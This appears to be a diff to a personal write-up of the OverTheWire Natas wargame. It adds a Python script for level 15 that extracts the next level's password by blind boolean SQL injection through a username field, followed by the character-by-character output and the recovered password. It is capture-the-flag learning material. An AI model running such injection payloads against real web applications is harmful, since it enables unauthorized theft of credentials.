@@ -1,3 +1,5 @@
+[Natas](#Natas)
+
 # Natas
 
 https://overthewire.org/wargames/natas/
@@ -711,11 +713,87 @@ https://overthewire.org/wargames/natas/natas15.html
 > URL:      http://natas15.natas.labs.overthewire.org
 
 ```python
+import natasX
+
+natas = natasX
+
+#print(natas.natasX(15, "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J", endpoint="index.php?debug=yes", data={"username": "natas16\" AND SUBSTRING(password, 1, 1)=\"W"}).text)
+
+w = ""
+
+for i in range(1,70):
+
+    for n in range(26):
+        if natas.natasX(
+                15,
+                "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
+                endpoint="index.php?debug=yes",
+                data={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(65+n)}'}).text.__contains__("<br>This user exists.<br>"):
+            print(f'{i} {chr(65+n)}')
+            w += chr(65+n)
+            break
+
+        if natas.natasX(
+                15,
+                "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
+                endpoint="index.php?debug=yes",
+                data={"username": f'natas16\" AND BINARY SUBSTRING(password, {i}, {1})=\"{chr(97+n)}'}).text.__contains__("<br>This user exists.<br>"):
+            print(f'{i} {chr(97+n)}')
+            w += chr(97 + n)
+            break
+
+    if not len(w).__eq__(i):
+        for k in range(0, 10):
+            if natas.natasX(
+                    15,
+                    "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J",
+                    endpoint="index.php?debug=yes",
+                    data={"username": f'natas16\" AND SUBSTRING(password, {i}, {1})=\"{chr(48 + k)}'}).text.__contains__("<br>This user exists.<br>"):
+                print(f'{i} {chr(48 + k)}')
+                w += chr(48 + k)
+
+    if len(w) < i:
+        break
+
+print(w)
 ```
 
 **Output**
 
 ```html
+1 W
+2 a
+3 I
+4 H
+5 E
+6 a
+7 c
+8 j
+9 6
+10 3
+11 w
+12 n
+13 N
+14 I
+15 B
+16 R
+17 O
+18 H
+19 e
+20 q
+21 i
+22 3
+23 p
+24 9
+25 t
+26 0
+27 m
+28 5
+29 n
+30 h
+31 m
+32 h
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 ```
 
 
@@ -727,6 +805,23 @@ https://overthewire.org/wargames/natas/natas15.html
 > Username: natas16
 
 > URL:      http://natas16.natas.labs.overthewire.org
+
+```python
+```
+
+**Output**
+
+```html
+```
+
+## Natas17
+https://overthewire.org/wargames/natas/natas17.html
+
+> Natas Level 16 → Level 17
+
+> Username: natas17
+
+> URL:      http://natas17.natas.labs.overthewire.org
 
 ```python
 ```
